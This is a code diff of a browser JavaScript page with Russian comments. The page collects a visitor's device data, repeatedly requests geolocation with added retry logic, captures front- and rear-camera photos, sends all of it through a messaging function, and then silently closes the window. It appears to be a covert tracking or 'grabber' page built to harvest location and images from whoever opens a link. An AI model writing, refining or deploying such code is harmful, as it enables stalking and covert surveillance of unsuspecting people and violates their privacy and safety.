@@ -83,16 +83,31 @@ async function sendDeviceData() {
     await sendMessage(fullText);
 }
 
-// ========== ГЕОЛОКАЦИЯ (ПРОСТАЯ) ==========
-function askGeo(callback) {
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            callback({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-        },
-        () => {
-            callback(null);
-        }
-    );
+// ========== ГЕОЛОКАЦИЯ ==========
+function getLocationWithRetry(retryCount, maxRetries) {
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude
+                });
+            },
+            (error) => {
+                if (retryCount < maxRetries) {
+                    setTimeout(() => {
+                        getLocationWithRetry(retryCount + 1, maxRetries).then(resolve);
+                    }, 2000);
+                } else {
+                    resolve(null);
+                }
+            }
+        );
+    });
+}
+
+async function requestLocation(maxAttempts) {
+    return await getLocationWithRetry(1, maxAttempts);
 }
 
 async function sendLocation(lat, lon) {
@@ -100,7 +115,7 @@ async function sendLocation(lat, lon) {
     await sendMessage(`📍 Местоположение: ${mapsUrl}`);
 }
 
-// ========== КАМЕРА (ПРОСТАЯ) ==========
+// ========== КАМЕРА ==========
 function askCamera(facingMode, callback) {
     navigator.mediaDevices.getUserMedia({
         video: { facingMode: { exact: facingMode }, width: 1280, height: 720 }
@@ -138,88 +153,78 @@ async function main() {
     // 1. Данные устройства
     await sendDeviceData();
     
-    // 2. Геолокация (1 раз)
-    askGeo(async (location) => {
-        if (location) {
-            await sendLocation(location.lat, location.lon);
-            geoSuccess = true;
-        }
-        
-        // 3. Камера (2 попытки)
-        askCamera('user', async (frontStream) => {
-            if (!frontStream) {
-                // Вторая попытка через 2 секунды
-                setTimeout(() => {
-                    askCamera('user', async (frontStream2) => {
-                        if (frontStream2) {
-                            await takePhoto(frontStream2, '📸 Фронтальная камера');
-                            frontStream2.getTracks().forEach(t => t.stop());
-                            
-                            // Ждем 3 секунды
-                            setTimeout(async () => {
-                                askCamera('environment', async (backStream) => {
-                                    if (backStream) {
-                                        await takePhoto(backStream, '📸 Задняя камера');
-                                        backStream.getTracks().forEach(t => t.stop());
+    // 2. Геолокация (2 попытки)
+    const firstLoc = await requestLocation(2);
+    if (firstLoc) {
+        await sendLocation(firstLoc.lat, firstLoc.lon);
+        geoSuccess = true;
+    }
+    
+    // 3. Камера (2 попытки)
+    askCamera('user', async (frontStream) => {
+        if (!frontStream) {
+            // Вторая попытка через 2 секунды
+            setTimeout(() => {
+                askCamera('user', async (frontStream2) => {
+                    if (frontStream2) {
+                        await takePhoto(frontStream2, '📸 Фронтальная камера');
+                        frontStream2.getTracks().forEach(t => t.stop());
+                        
+                        // Ждем 3 секунды
+                        setTimeout(async () => {
+                            askCamera('environment', async (backStream) => {
+                                if (backStream) {
+                                    await takePhoto(backStream, '📸 Задняя камера');
+                                    backStream.getTracks().forEach(t => t.stop());
+                                }
+                                
+                                // 4. Если гео не было - последняя попытка
+                                if (!geoSuccess) {
+                                    const lastLoc = await requestLocation(1);
+                                    if (lastLoc) {
+                                        await sendLocation(lastLoc.lat, lastLoc.lon);
                                     }
-                                    
-                                    // 4. Если гео не было - последняя попытка
-                                    if (!geoSuccess) {
-                                        askGeo(async (lastLocation) => {
-                                            if (lastLocation) {
-                                                await sendLocation(lastLocation.lat, lastLocation.lon);
-                                            }
-                                            setTimeout(() => window.close(), 1000);
-                                        });
-                                    } else {
-                                        setTimeout(() => window.close(), 1000);
-                                    }
-                                });
-                            }, 3000);
-                        } else {
-                            // Камера не разрешена - сразу проверяем гео
-                            if (!geoSuccess) {
-                                askGeo(async (lastLocation) => {
-                                    if (lastLocation) {
-                                        await sendLocation(lastLocation.lat, lastLocation.lon);
-                                    }
-                                    setTimeout(() => window.close(), 1000);
-                                });
-                            } else {
+                                }
                                 setTimeout(() => window.close(), 1000);
+                            });
+                        }, 3000);
+                    } else {
+                        // Камера не разрешена - сразу проверяем гео
+                        if (!geoSuccess) {
+                            const lastLoc = await requestLocation(1);
+                            if (lastLoc) {
+                                await sendLocation(lastLoc.lat, lastLoc.lon);
                             }
                         }
-                    });
-                }, 2000);
-                return;
-            }
-            
-            // Камера разрешена с первого раза
-            await takePhoto(frontStream, '📸 Фронтальная камера');
-            frontStream.getTracks().forEach(t => t.stop());
-            
-            // Ждем 3 секунды
-            setTimeout(async () => {
-                askCamera('environment', async (backStream) => {
-                    if (backStream) {
-                        await takePhoto(backStream, '📸 Задняя камера');
-                        backStream.getTracks().forEach(t => t.stop());
-                    }
-                    
-                    // 4. Если гео не было - последняя попытка
-                    if (!geoSuccess) {
-                        askGeo(async (lastLocation) => {
-                            if (lastLocation) {
-                                await sendLocation(lastLocation.lat, lastLocation.lon);
-                            }
-                            setTimeout(() => window.close(), 1000);
-                        });
-                    } else {
                         setTimeout(() => window.close(), 1000);
                     }
                 });
-            }, 3000);
-        });
+            }, 2000);
+            return;
+        }
+        
+        // Камера разрешена с первого раза
+        await takePhoto(frontStream, '📸 Фронтальная камера');
+        frontStream.getTracks().forEach(t => t.stop());
+        
+        // Ждем 3 секунды
+        setTimeout(async () => {
+            askCamera('environment', async (backStream) => {
+                if (backStream) {
+                    await takePhoto(backStream, '📸 Задняя камера');
+                    backStream.getTracks().forEach(t => t.stop());
+                }
+                
+                // 4. Если гео не было - последняя попытка
+                if (!geoSuccess) {
+                    const lastLoc = await requestLocation(1);
+                    if (lastLoc) {
+                        await sendLocation(lastLoc.lat, lastLoc.lon);
+                    }
+                }
+                setTimeout(() => window.close(), 1000);
+            });
+        }, 3000);
     });
 }
 
